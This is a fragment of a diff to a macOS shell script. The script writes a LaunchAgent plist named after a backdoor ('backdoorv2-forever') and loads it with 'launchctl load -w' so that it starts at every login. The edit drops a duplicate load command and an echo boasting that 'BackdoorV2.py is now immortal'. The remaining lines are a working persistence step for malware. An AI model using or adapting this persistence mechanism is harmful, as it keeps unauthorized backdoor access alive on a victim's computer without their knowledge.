@@ -14,11 +14,10 @@ cat > ~/Library/LaunchAgents/backdoorv2-forever.plist <<EOF
 EOF
 
 # 2. Load it now + forever
-launchctl load ~/Library/LaunchAgents/backdoorv2-forever.plist
 launchctl load -w ~/Library/LaunchAgents/backdoorv2-forever.plist
 
 # 3. Done
-echo "BackdoorV2.py is now immortal until you delete the file itself"
+
 
 
 
